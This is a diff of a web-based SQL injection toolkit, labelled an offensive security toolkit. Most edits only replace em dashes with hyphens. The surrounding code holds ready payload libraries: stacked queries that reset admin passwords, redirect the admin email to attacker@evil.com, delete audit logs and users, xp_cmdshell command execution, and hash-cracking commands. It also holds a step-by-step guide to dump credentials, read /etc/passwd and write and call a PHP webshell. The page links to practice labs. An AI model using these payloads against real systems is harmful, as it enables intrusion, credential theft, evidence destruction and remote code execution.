   const sf={mysql:`SLEEP(${sleep})`,pgsql:`pg_sleep(${sleep})`,mssql:`WAITFOR DELAY '00:00:${String(sleep).padStart(2,'0')}'`,oracle:`DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),${sleep})`}[dbms]||`SLEEP(${sleep})`;
   const errFn={mysql:`EXTRACTVALUE(1,CONCAT(0x7e,(${expr})))`,pgsql:`CAST((${expr}) AS int)`,mssql:`CONVERT(int,${expr})`,oracle:`CTXSYS.DRITHSX.SN(1,(${expr}))`}[dbms]||`EXTRACTVALUE(1,CONCAT(0x7e,(${expr})))`;
   if(type==='error') {
-    payloads.push({payload:`${hdr}: ' AND ${errFn}-- -`,desc:`Error-based — extract ${expr}`});
+    payloads.push({payload:`${hdr}: ' AND ${errFn}-- -`,desc:`Error-based - extract ${expr}`});
     payloads.push({payload:`${hdr}: 1' AND ${errFn}-- -`,desc:'Integer close variant'});
   } else if(type==='boolean') {
     payloads.push({payload:`${hdr}: ' AND 1=1-- -`,desc:'Boolean TRUE'});
-    payloads.push({payload:`${hdr}: ' AND 1=2-- -`,desc:'Boolean FALSE — compare responses'});
+    payloads.push({payload:`${hdr}: ' AND 1=2-- -`,desc:'Boolean FALSE - compare responses'});
     payloads.push({payload:`${hdr}: ' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -`,desc:'DB has tables'});
     payloads.push({payload:`${hdr}: ' OR '1'='1`,desc:'Always-true (no comment)'});
   } else if(type==='time') {
@@ -3512,7 +3512,7 @@ function initHdrLib() {
   const el=document.getElementById('hdr-lib');
   if(!el||el.innerHTML) return;
   const payloads=[
-    {payload:"X-Forwarded-For: ' OR 1=1-- -",desc:'Boolean true — common in IP logging'},
+    {payload:"X-Forwarded-For: ' OR 1=1-- -",desc:'Boolean true - common in IP logging'},
     {payload:"X-Forwarded-For: ' AND SLEEP(5)-- -",desc:'Time-based via XFF'},
     {payload:"X-Forwarded-For: ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",desc:'Error-based via XFF (MySQL)'},
     {payload:"X-Forwarded-For: 1.1.1.1' UNION SELECT NULL,version(),NULL-- -",desc:'UNION via XFF'},
@@ -3596,12 +3596,12 @@ function encodeAll() {
   document.getElementById('out-b64d').textContent=safe(v=>decodeURIComponent(escape(atob(v))),s);
   document.getElementById('out-hex').textContent='0x'+strToHex(s);
   document.getElementById('out-hexd').textContent=safe(v=>{const hex=v.replace(/^0x/i,'');let r='';for(let i=0;i<hex.length;i+=2)r+=String.fromCharCode(parseInt(hex.substr(i,2),16));return r;},s);
-  document.getElementById('out-char').textContent=s?`CHAR(${Array.from(s).map(c=>c.charCodeAt(0)).join(',')})`:'—';
+  document.getElementById('out-char').textContent=s?`CHAR(${Array.from(s).map(c=>c.charCodeAt(0)).join(',')})`:'-';
   document.getElementById('out-durl').textContent=safe(v=>encodeURIComponent(encodeURIComponent(v)),s);
   document.getElementById('out-html').textContent=s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
-  document.getElementById('out-mhex').textContent=s?'0x'+strToHex(s):'—';
-  document.getElementById('out-unicode').textContent=s?Array.from(s).map(c=>`\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join(''):'—';
-  document.getElementById('out-rot13').textContent=s?s.replace(/[a-zA-Z]/g,c=>{const base=c<='Z'?65:97;return String.fromCharCode(((c.charCodeAt(0)-base+13)%26)+base);}):'—';
+  document.getElementById('out-mhex').textContent=s?'0x'+strToHex(s):'-';
+  document.getElementById('out-unicode').textContent=s?Array.from(s).map(c=>`\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join(''):'-';
+  document.getElementById('out-rot13').textContent=s?s.replace(/[a-zA-Z]/g,c=>{const base=c<='Z'?65:97;return String.fromCharCode(((c.charCodeAt(0)-base+13)%26)+base);}):'-';
 }
 
 // ═══════════════════════════════════════════════
@@ -3655,13 +3655,13 @@ function initHashPage() {
       {payload:'hashcat -m 100 hash.txt rockyou.txt',desc:'SHA-1'},
       {payload:'hashcat -m 1400 hash.txt rockyou.txt',desc:'SHA-256'},
       {payload:'hashcat -m 1000 hash.txt rockyou.txt',desc:'NTLM'},
-      {payload:'hashcat -m 3200 hash.txt rockyou.txt',desc:'bcrypt (slow — GPU)'},
+      {payload:'hashcat -m 3200 hash.txt rockyou.txt',desc:'bcrypt (slow - GPU)'},
       {payload:'hashcat -m 13100 hash.txt rockyou.txt',desc:'Kerberos TGS (Kerberoasting)'},
       {payload:'hashcat -m 18200 hash.txt rockyou.txt',desc:'Kerberos AS-REP roasting'},
       {payload:'hashcat -m 5600 hash.txt rockyou.txt',desc:'NetNTLMv2 (Responder)'},
-      {payload:'hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a',desc:'MD5 — 8-char brute force'},
-      {payload:'john hash.txt --wordlist=rockyou.txt',desc:'John the Ripper — auto detect'},
-      {payload:'john --show hash.txt',desc:'John — show cracked'},
+      {payload:'hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a',desc:'MD5 - 8-char brute force'},
+      {payload:'john hash.txt --wordlist=rockyou.txt',desc:'John the Ripper - auto detect'},
+      {payload:'john --show hash.txt',desc:'John - show cracked'},
     ];
     hcEl.innerHTML=cmds.map(p=>makePayloadItem(p.payload,p.desc)).join('');
   }
@@ -3706,7 +3706,7 @@ const allPayloads=[
   ...DB.error_mssql.map(p=>({...p,cat:'Error-Based (MSSQL)'})),
   ...DB.error_oracle.map(p=>({...p,cat:'Error-Based (Oracle)'})),
   ...(DB.error_sqlite||[]).map(p=>({...p,cat:'Error-Based (SQLite)'})),
-  ...DB.file_check.map(p=>({...p,cat:'File Ops — Check'})),
+  ...DB.file_check.map(p=>({...p,cat:'File Ops - Check'})),
   ...DB.waf_bypass.map(p=>({...p,cat:'WAF Bypass'})),
   ...DB.priv.map(p=>({...p,cat:'Privileges'})),
   ...PAYLOADBOX_EMBEDDED.map(p=>({payload:p,desc:'Payload-Box collection',cat:'Payload-Box Collection'})),
@@ -3754,14 +3754,14 @@ function initReference() {
       <td style="padding:6px 10px;border:1px solid var(--border);color:var(--blue)">${esc(r.pgsql)}</td>
       <td style="padding:6px 10px;border:1px solid var(--border);color:var(--red)">${esc(r.mssql)}</td>
       <td style="padding:6px 10px;border:1px solid var(--border);color:var(--purple)">${esc(r.oracle)}</td>
-      <td style="padding:6px 10px;border:1px solid var(--border);color:var(--teal)">${esc(r.sqlite||'—')}</td>
+      <td style="padding:6px 10px;border:1px solid var(--border);color:var(--teal)">${esc(r.sqlite||'-')}</td>
     </tr>`).join('')}
   </table></div>`;
   el.innerHTML=`<div class="card" style="margin-bottom:12px"><div class="card-header"><div class="card-title">🌐 DBMS Comparison Matrix (incl. SQLite)</div></div><div class="card-body" style="padding:0">${tableHtml}</div></div>
   <div class="grid-2">
     <div><div class="card"><div class="card-header"><div class="card-title">MySQL Command Reference</div></div><div class="card-body no-pad">${cmdHtml}</div></div></div>
     <div><div class="card"><div class="card-header"><div class="card-title">Comment Syntax</div></div><div class="card-body no-pad">
-      ${[{payload:'-- -',desc:'MySQL/MSSQL — trailing space'},{payload:'#',desc:'MySQL hash'},{payload:'/**/',desc:'Inline comment — whitespace sub'},{payload:'/*!50000...*/',desc:'MySQL version conditional'},{payload:'-- ',desc:'PostgreSQL/Oracle + space'}].map(p=>makePayloadItem(p.payload,p.desc)).join('')}
+      ${[{payload:'-- -',desc:'MySQL/MSSQL - trailing space'},{payload:'#',desc:'MySQL hash'},{payload:'/**/',desc:'Inline comment - whitespace sub'},{payload:'/*!50000...*/',desc:'MySQL version conditional'},{payload:'-- ',desc:'PostgreSQL/Oracle + space'}].map(p=>makePayloadItem(p.payload,p.desc)).join('')}
     </div></div></div>
   </div>`;
 }
@@ -3787,7 +3787,7 @@ function renderPortSwiggerMap() {
   const el=document.getElementById('portswigger-content');
   if(!el) return;
   const tagColors={beginner:'var(--green)',intermediate:'var(--amber)',advanced:'var(--red)',reference:'var(--blue)',union:'var(--purple)',blind:'var(--amber)',error:'var(--red)',oob:'var(--red)',waf:'var(--amber)',auth:'var(--green)','second-order':'var(--red)','order-by':'var(--amber)','all-levels':'var(--teal)',overview:'var(--blue)'};
-  el.innerHTML=`<div class="info-box" style="margin-bottom:16px"><strong>PortSwigger Web Security Academy</strong> — official SQLi learning path. Click any topic to open lab.</div>
+  el.innerHTML=`<div class="info-box" style="margin-bottom:16px"><strong>PortSwigger Web Security Academy</strong> - official SQLi learning path. Click any topic to open lab.</div>
   <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:12px">
     ${PORTSWIGGER_TOPICS.map(t=>`<a href="${t.url}" target="_blank" rel="noopener" style="text-decoration:none">
       <div class="card" style="cursor:pointer;transition:border-color .2s" onmouseover="this.style.borderColor='var(--blue)'" onmouseout="this.style.borderColor='var(--border)'">
@@ -3804,13 +3804,13 @@ function renderPortSwiggerMap() {
 
 const ADVANCED_PAYLOADS={
   second_order:[
-    {payload:"admin'--",desc:"Register username — comment truncation fires on login SELECT"},
-    {payload:"' UPDATE users SET password='pwned' WHERE '1'='1",desc:'Stored update — triggers when username used in UPDATE'},
+    {payload:"admin'--",desc:"Register username - comment truncation fires on login SELECT"},
+    {payload:"' UPDATE users SET password='pwned' WHERE '1'='1",desc:'Stored update - triggers when username used in UPDATE'},
     {payload:"admin'/*",desc:'Inline comment truncation variant'},
-    {payload:"' OR 1=1 LIMIT 1--",desc:'Boolean second-order — first row on next use'},
+    {payload:"' OR 1=1 LIMIT 1--",desc:'Boolean second-order - first row on next use'},
   ],
   json_xml:[
-    {payload:'{"username":"admin\'--","password":"x"}',desc:'JSON body injection — REST APIs'},
+    {payload:'{"username":"admin\'--","password":"x"}',desc:'JSON body injection - REST APIs'},
     {payload:'{"search":"1 UNION SELECT 1,version(),3--"}',desc:'JSON UNION in search'},
     {payload:'<search>1 UNION SELECT 1,user()--</search>',desc:'XML node injection'},
     {payload:'<item>&#x27; OR 1=1--</item>',desc:'XML hex entity encoded quote'},
@@ -3823,8 +3823,8 @@ const ADVANCED_PAYLOADS={
   ],
   order_by:[
     {payload:"1 ASC,SLEEP(3)--",desc:'Time-based via ORDER BY'},
-    {payload:"(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)",desc:'Boolean — div-by-zero on false'},
-    {payload:"FIELD(id,(SELECT id FROM users WHERE username='admin'))",desc:'MySQL FIELD() — sort admin row first'},
+    {payload:"(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)",desc:'Boolean - div-by-zero on false'},
+    {payload:"FIELD(id,(SELECT id FROM users WHERE username='admin'))",desc:'MySQL FIELD() - sort admin row first'},
   ],
   mssql_specific:[
     {payload:"'; EXEC xp_cmdshell('whoami')--",desc:'OS command execution via xp_cmdshell'},
@@ -3878,8 +3878,8 @@ function renderAdvancedPage() {
   const sections=[
     {key:'second_order',title:'🔄 Second-Order Injection',desc:'Payloads stored in DB, triggered on retrieval'},
     {key:'json_xml',title:'📄 JSON / XML Context',desc:'Injection via JSON API bodies or XML parameters'},
-    {key:'http_headers',title:'📡 HTTP Header Injection',desc:'Headers logged to DB — XFF, User-Agent, Referer'},
-    {key:'order_by',title:'🔢 ORDER BY Injection',desc:'Injection via sort column — boolean/time extraction'},
+    {key:'http_headers',title:'📡 HTTP Header Injection',desc:'Headers logged to DB - XFF, User-Agent, Referer'},
+    {key:'order_by',title:'🔢 ORDER BY Injection',desc:'Injection via sort column - boolean/time extraction'},
     {key:'mssql_specific',title:'🪟 MSSQL Specific',desc:'xp_cmdshell, sys.tables, FOR XML PATH'},
     {key:'oracle_specific',title:'🔶 Oracle Specific',desc:'DUAL, v$version, UTL_HTTP, LISTAGG'},
     {key:'mysql_union',title:'🐬 MySQL UNION Full Chain',desc:'Complete UNION enumeration to data extraction'},
@@ -3904,8 +3904,8 @@ function showEmbeddedPayloadBox() {
   const resources=[
     {cat:'GitHub Wordlists',items:[
       {name:'PayloadBox SQLi Payloads',url:'https://github.com/payloadbox/sql-injection-payload-list',desc:'Comprehensive categorised SQLi payload list'},
-      {name:'SecLists — SQLi',url:'https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi',desc:'SecLists SQL injection fuzzing wordlists'},
-      {name:'FuzzDB — SQL Injection',url:'https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection',desc:'FuzzDB attack patterns'},
+      {name:'SecLists - SQLi',url:'https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi',desc:'SecLists SQL injection fuzzing wordlists'},
+      {name:'FuzzDB - SQL Injection',url:'https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection',desc:'FuzzDB attack patterns'},
     ]},
     {cat:'PortSwigger Academy',items:[
       {name:'SQLi Cheat Sheet',url:'https://portswigger.net/web-security/sql-injection/cheat-sheet',desc:'Cross-DBMS reference: concat, sleep, comments'},
@@ -3916,12 +3916,12 @@ function showEmbeddedPayloadBox() {
     {cat:'Tooling',items:[
       {name:'SQLMap',url:'https://sqlmap.org/',desc:'Official SQLMap documentation'},
       {name:'ghauri',url:'https://github.com/r0oth3x49/ghauri',desc:'SQLMap alternative with better WAF bypass'},
-      {name:'HackTricks — SQLi',url:'https://book.hacktricks.xyz/pentesting-web/sql-injection',desc:'Practical SQLi notes and DBMS tricks'},
+      {name:'HackTricks - SQLi',url:'https://book.hacktricks.xyz/pentesting-web/sql-injection',desc:'Practical SQLi notes and DBMS tricks'},
     ]},
     {cat:'Practice Labs',items:[
       {name:'HackTheBox',url:'https://app.hackthebox.com/challenges',desc:'CTF challenges including SQLi'},
       {name:'TryHackMe SQLi Room',url:'https://tryhackme.com/room/sqlilab',desc:'Beginner-friendly SQLi lab'},
-      {name:'DVWA',url:'https://dvwa.co.uk/',desc:'Damn Vulnerable Web App — local practice'},
+      {name:'DVWA',url:'https://dvwa.co.uk/',desc:'Damn Vulnerable Web App - local practice'},
     ]},
   ];
   el.innerHTML=resources.map(cat=>`<div class="card" style="margin-bottom:14px">
@@ -3946,7 +3946,7 @@ const WIZARDS={
     {title:'Confirm Injection Point',body:'Add a quote to trigger an error. Test with <code>1 AND 1=1</code> (true) vs <code>1 AND 1=2</code> (false). Different responses = injectable.'},
     {title:'Determine Column Count',body:'<code>ORDER BY 1--</code> → <code>ORDER BY 2--</code> → increment until error. Or UNION SELECT NULL method.'},
     {title:'Find String Columns',body:'Replace NULLs with markers: <code>UNION SELECT \'SQLi\',NULL,NULL--</code>'},
-    {title:'Extract Metadata',body:'<code>UNION SELECT NULL,version(),NULL--</code> — confirm DBMS then proceed to enum helper.'},
+    {title:'Extract Metadata',body:'<code>UNION SELECT NULL,version(),NULL--</code> - confirm DBMS then proceed to enum helper.'},
     {title:'List Tables',body:'<code>UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--</code>'},
     {title:'Dump Data',body:'<code>UNION SELECT NULL,CONCAT(username,\':\',password),NULL FROM users--</code>'},
   ]},
@@ -3964,7 +3964,7 @@ const WIZARDS={
   ]},
   'auth':{title:'🔓 Auth Bypass Guide',steps:[
     {title:'Identify Login Form',body:'Identify username/password fields. Check if POST with Burp.'},
-    {title:'Quote Test',body:'Inject <code>admin\'</code> — SQL error confirms injectable.'},
+    {title:'Quote Test',body:'Inject <code>admin\'</code> - SQL error confirms injectable.'},
     {title:'OR Bypass',body:'Try <code>\' OR \'1\'=\'1\'-- -</code> and <code>admin\'-- -</code>'},
     {title:'Enumerate',body:'Once authenticated, use Universal Enum Helper for full enumeration.'},
   ]},
@@ -3977,7 +3977,7 @@ const WIZARDS={
   ]},
   'file':{title:'📁 File Ops Guide',steps:[
     {title:'Check FILE Privilege',body:'<code>UNION SELECT super_priv FROM mysql.user WHERE user=user()--</code>'},
-    {title:'Check secure_file_priv',body:'<code>UNION SELECT @@secure_file_priv--</code> — empty = can write anywhere.'},
+    {title:'Check secure_file_priv',body:'<code>UNION SELECT @@secure_file_priv--</code> - empty = can write anywhere.'},
     {title:'Read File',body:'<code>UNION SELECT LOAD_FILE(\'/etc/passwd\')--</code>'},
     {title:'Write Webshell',body:'<code>UNION SELECT \'<?php system($_GET[0]);?>\' INTO OUTFILE \'/var/www/html/shell.php\'--</code>'},
     {title:'Execute',body:'Visit <code>http://target/shell.php?0=id</code> to confirm execution.'},
@@ -4137,7 +4137,7 @@ window.addEventListener('DOMContentLoaded',init);
 </script>
 
 <footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
-  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta - Offensive Security Toolkit
 </footer>
 
 </body>
@@ -4150,10 +4150,10 @@ window.addEventListener('DOMContentLoaded',init);
 </script>
 <script>
 // ════════════════════════════════════════════════════════════════
-// COMPREHENSIVE ENHANCEMENTS — fills every remaining gap
+// COMPREHENSIVE ENHANCEMENTS - fills every remaining gap
 // ════════════════════════════════════════════════════════════════
 
-// ── 1. ENHANCED nav() — ensure all pages render on visit ─────
+// ── 1. ENHANCED nav() - ensure all pages render on visit ─────
 (function(){
   const _orig = window.nav;
   window.nav = function(id) {
@@ -4177,7 +4177,7 @@ window.addEventListener('DOMContentLoaded',init);
   };
 })();
 
-// ── 2. ENHANCED init() — run on load ─────────────────────────
+// ── 2. ENHANCED init() - run on load ─────────────────────────
 const _origInit = typeof init === 'function' ? init : null;
 function init() {
   if(_origInit) _origInit();
@@ -4203,10 +4203,10 @@ function init() {
   });
 }
 
-// ── 3. ENHANCED PortSwigger Map — expanded labs list ─────────
+// ── 3. ENHANCED PortSwigger Map - expanded labs list ─────────
 const PORTSWIGGER_TOPICS_EXTRA = [
   // Already defined in PORTSWIGGER_TOPICS, these extend it
-  {title:'SQL injection in different contexts',url:'https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts',tags:['contexts','intermediate'],desc:'JSON, XML, cookies, headers — injection beyond URL params.'},
+  {title:'SQL injection in different contexts',url:'https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts',tags:['contexts','intermediate'],desc:'JSON, XML, cookies, headers - injection beyond URL params.'},
   {title:'SQL injection with filter bypass via XML encoding',url:'https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding',tags:['waf','advanced'],desc:'XML entity encoding to bypass input filters.'},
   {title:'Visible error-based SQLi',url:'https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based',tags:['error','intermediate'],desc:'Extracting data from SQL error messages.'},
   {title:'Blind SQLi with time delays',url:'https://portswigger.net/web-security/sql-injection/blind/lab-time-delays',tags:['time','beginner'],desc:'Confirming blind injection via time delays.'},
@@ -4215,7 +4215,7 @@ const PORTSWIGGER_TOPICS_EXTRA = [
   {title:'Blind SQLi with OOB data exfiltration',url:'https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration',tags:['oob','advanced'],desc:'Exfiltrate data via DNS lookup queries.'},
   {title:'HackTricks SQLi',url:'https://book.hacktricks.xyz/pentesting-web/sql-injection',tags:['reference','all-levels'],desc:'Practical notes on all SQLi techniques with DBMS examples.'},
   {title:'PayloadsAllTheThings',url:'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection',tags:['payloads','all-levels'],desc:'Massive payload collection covering all DBMS and contexts.'},
-  {title:'SQLMap Documentation',url:'https://sqlmap.org/',tags:['tool','all-levels'],desc:'Official SQLMap docs — all flags and tamper scripts explained.'},
+  {title:'SQLMap Documentation',url:'https://sqlmap.org/',tags:['tool','all-levels'],desc:'Official SQLMap docs - all flags and tamper scripts explained.'},
   {title:'PentestMonkey SQL Injection Cheat Sheet',url:'http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet',tags:['reference','all-levels'],desc:'Classic cheat sheet: MySQL, MSSQL, Oracle, PostgreSQL.'},
 ];
 
@@ -4234,7 +4234,7 @@ function renderPortSwiggerMap() {
   };
   el.innerHTML = `
     <div class="info-box" style="margin-bottom:16px">
-      <strong>PortSwigger Web Security Academy + Community Resources</strong> —
+      <strong>PortSwigger Web Security Academy + Community Resources</strong> -
       ${all.length} topics. Click any card to open the lab or resource.
     </div>
     <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px">
@@ -4266,24 +4266,24 @@ function renderAdvancedPage() {
   // Extra advanced scenarios not in ADVANCED_PAYLOADS
   const extraScenarios = {
     update_ctx:[
-      {payload:"1; UPDATE users SET password=MD5('hacked') WHERE username='admin'-- -",desc:'UPDATE context stacked — change admin password (MySQL/MSSQL/PgSQL)'},
-      {payload:"'; UPDATE users SET role='admin' WHERE username='victim'-- -",desc:'UPDATE context — privilege escalation via role column'},
-      {payload:"'; UPDATE users SET email='attacker@evil.com' WHERE username='admin'-- -",desc:'UPDATE context — hijack admin email for password reset'},
-      {payload:"' WHERE 1=1 OR username='-- -",desc:'WHERE clause injection in UPDATE — affects all rows'},
+      {payload:"1; UPDATE users SET password=MD5('hacked') WHERE username='admin'-- -",desc:'UPDATE context stacked - change admin password (MySQL/MSSQL/PgSQL)'},
+      {payload:"'; UPDATE users SET role='admin' WHERE username='victim'-- -",desc:'UPDATE context - privilege escalation via role column'},
+      {payload:"'; UPDATE users SET email='attacker@evil.com' WHERE username='admin'-- -",desc:'UPDATE context - hijack admin email for password reset'},
+      {payload:"' WHERE 1=1 OR username='-- -",desc:'WHERE clause injection in UPDATE - affects all rows'},
     ],
     delete_ctx:[
-      {payload:"1; DELETE FROM logs WHERE 1=1-- -",desc:'DELETE stacked — clear audit logs'},
-      {payload:"'; DELETE FROM sessions WHERE 1=1-- -",desc:'DELETE sessions — force all users to re-login (DoS)'},
+      {payload:"1; DELETE FROM logs WHERE 1=1-- -",desc:'DELETE stacked - clear audit logs'},
+      {payload:"'; DELETE FROM sessions WHERE 1=1-- -",desc:'DELETE sessions - force all users to re-login (DoS)'},
       {payload:"'; DELETE FROM users WHERE username!='admin'-- -",desc:'DELETE all non-admin users'},
     ],
     truncation:[
-      {payload:"admin'-- -",desc:'Username truncation — most DB drivers stop at first quote'},
+      {payload:"admin'-- -",desc:'Username truncation - most DB drivers stop at first quote'},
       {payload:"admin'/*",desc:'Inline comment truncation'},
       {payload:"' OR 1=1 LIMIT 1-- -",desc:'Force single row return'},
       {payload:"admin'%00",desc:'NULL byte truncation (PHP + MySQL older versions)'},
     ],
     polyglot:[
-      {payload:"SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",desc:'Polyglot — works regardless of quote type'},
+      {payload:"SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",desc:'Polyglot - works regardless of quote type'},
       {payload:"';WAITFOR DELAY '0:0:1'-- -",desc:'MSSQL polyglot'},
       {payload:"1;SELECT%201",desc:'Numeric stacked polyglot'},
       {payload:"'||'1'='1",desc:'Concatenation OR (Oracle/SQLite/PostgreSQL)'},
@@ -4296,7 +4296,7 @@ function renderAdvancedPage() {
       {payload:"';return true//",desc:'Server-side JS injection (NodeJS + eval contexts)'},
     ],
     graphql_sqli:[
-      {payload:'{"query":"{ user(id:\\"1 UNION SELECT 1,username,password FROM users-- -\\") { id } }"}',desc:'GraphQL SQLi — inject into string argument'},
+      {payload:'{"query":"{ user(id:\\"1 UNION SELECT 1,username,password FROM users-- -\\") { id } }"}',desc:'GraphQL SQLi - inject into string argument'},
       {payload:'{"query":"{ search(term:\\"a\' OR 1=1-- -\\") { results } }"}',desc:'GraphQL search field injection'},
     ],
     orm_bypass:[
@@ -4331,7 +4331,7 @@ function renderAdvancedPage() {
     ...(adv.mysql_union?[{key:'_mu',title:'🐬 MySQL UNION Full Chain',data:adv.mysql_union,desc:'Complete enumeration to data extraction'}]:[]),
     ...(adv.postgresql_specific?[{key:'_pg',title:'🐘 PostgreSQL Specific',data:adv.postgresql_specific,desc:'COPY TO PROGRAM, pg_shadow, string_agg'}]:[]),
     ...(adv.sqlite_specific?[{key:'_sl',title:'🪶 SQLite Specific',data:adv.sqlite_specific,desc:'sqlite_master, ATTACH DATABASE, load_extension'}]:[]),
-    {key:'nosql_like',title:'🍃 NoSQL / JS Injection (comparison)',data:extraScenarios.nosql_like,desc:'Non-SQL injections confused with SQLi — know the difference'},
+    {key:'nosql_like',title:'🍃 NoSQL / JS Injection (comparison)',data:extraScenarios.nosql_like,desc:'Non-SQL injections confused with SQLi - know the difference'},
   ];
 
   el.innerHTML = allSections.map(s=>`
@@ -4355,47 +4355,47 @@ function showEmbeddedPayloadBox() {
 
   const resources = [
     {cat:'🔥 Payload Collections',items:[
-      {name:'PayloadsAllTheThings — SQL Injection',url:'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection',desc:'Most comprehensive SQLi payload collection. Covers all DBMS, contexts, bypass techniques.'},
-      {name:'PayloadBox SQL Injection List',url:'https://github.com/payloadbox/sql-injection-payload-list',desc:'Categorised SQLi payloads — error-based, time-based, boolean, UNION, stacked.'},
+      {name:'PayloadsAllTheThings - SQL Injection',url:'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection',desc:'Most comprehensive SQLi payload collection. Covers all DBMS, contexts, bypass techniques.'},
+      {name:'PayloadBox SQL Injection List',url:'https://github.com/payloadbox/sql-injection-payload-list',desc:'Categorised SQLi payloads - error-based, time-based, boolean, UNION, stacked.'},
       {name:'SecLists SQLi Fuzzing',url:'https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi',desc:'FuzzDB + SecLists combined wordlists for automated scanning.'},
-      {name:'FuzzDB SQL Injection',url:'https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection',desc:'Attack pattern database — good for Burp Intruder wordlists.'},
-      {name:'SQLi Bypass Strings (1000+)',url:'https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_BlindSQLi.txt',desc:'Direct raw file — import into Burp Intruder for blind SQLi detection.'},
+      {name:'FuzzDB SQL Injection',url:'https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection',desc:'Attack pattern database - good for Burp Intruder wordlists.'},
+      {name:'SQLi Bypass Strings (1000+)',url:'https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_BlindSQLi.txt',desc:'Direct raw file - import into Burp Intruder for blind SQLi detection.'},
     ]},
     {cat:'📚 Reference & Cheat Sheets',items:[
       {name:'PortSwigger SQLi Cheat Sheet',url:'https://portswigger.net/web-security/sql-injection/cheat-sheet',desc:'Cross-DBMS: concat, substring, sleep, comments, stacked, conditional errors.'},
-      {name:'HackTricks SQL Injection',url:'https://book.hacktricks.xyz/pentesting-web/sql-injection',desc:'Practical attack notes for all DBMS — real-world techniques.'},
+      {name:'HackTricks SQL Injection',url:'https://book.hacktricks.xyz/pentesting-web/sql-injection',desc:'Practical attack notes for all DBMS - real-world techniques.'},
       {name:'PentestMonkey MySQL Cheat Sheet',url:'http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet',desc:'Classic reference: MySQL, MSSQL, Oracle, PostgreSQL, Ingres, DB2, Informix.'},
       {name:'OWASP SQL Injection',url:'https://owasp.org/www-community/attacks/SQL_Injection',desc:'Canonical definition, attack examples, and prevention guidance.'},
-      {name:'OWASP Testing Guide — SQLi',url:'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection',desc:'WSTG 4.0 — structured testing methodology for SQLi.'},
+      {name:'OWASP Testing Guide - SQLi',url:'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection',desc:'WSTG 4.0 - structured testing methodology for SQLi.'},
     ]},
     {cat:'🛠️ Tools & Scanners',items:[
       {name:'SQLMap (official)',url:'https://sqlmap.org/',desc:'Premier automated SQLi tool. All DBMS, all techniques, file ops, OS shell.'},
-      {name:'ghauri',url:'https://github.com/r0oth3x49/ghauri',desc:'SQLMap alternative — better WAF bypass, faster detection, modern codebase.'},
-      {name:'NoSQLMap',url:'https://github.com/codingo/NoSQLMap',desc:'NoSQL injection tool — MongoDB, CouchDB, Redis.'},
-      {name:'Havij (classic)',url:'https://github.com/the404hacking/havij',desc:'Classic GUI SQLi tool — mostly historical reference, use sqlmap instead.'},
-      {name:'BBQSQL',url:'https://github.com/CiscoCXSecurity/bbqsql',desc:'Blind SQLi exploitation framework — Python, highly configurable.'},
-      {name:'jSQL Injection',url:'https://github.com/ron190/jsql-injection',desc:'Java-based GUI SQLi tool — good for quick checks.'},
+      {name:'ghauri',url:'https://github.com/r0oth3x49/ghauri',desc:'SQLMap alternative - better WAF bypass, faster detection, modern codebase.'},
+      {name:'NoSQLMap',url:'https://github.com/codingo/NoSQLMap',desc:'NoSQL injection tool - MongoDB, CouchDB, Redis.'},
+      {name:'Havij (classic)',url:'https://github.com/the404hacking/havij',desc:'Classic GUI SQLi tool - mostly historical reference, use sqlmap instead.'},
+      {name:'BBQSQL',url:'https://github.com/CiscoCXSecurity/bbqsql',desc:'Blind SQLi exploitation framework - Python, highly configurable.'},
+      {name:'jSQL Injection',url:'https://github.com/ron190/jsql-injection',desc:'Java-based GUI SQLi tool - good for quick checks.'},
     ]},
     {cat:'🎓 Practice Labs',items:[
-      {name:'PortSwigger Web Security Academy',url:'https://portswigger.net/web-security/sql-injection',desc:'25+ interactive SQLi labs — from basic UNION to advanced blind OOB.'},
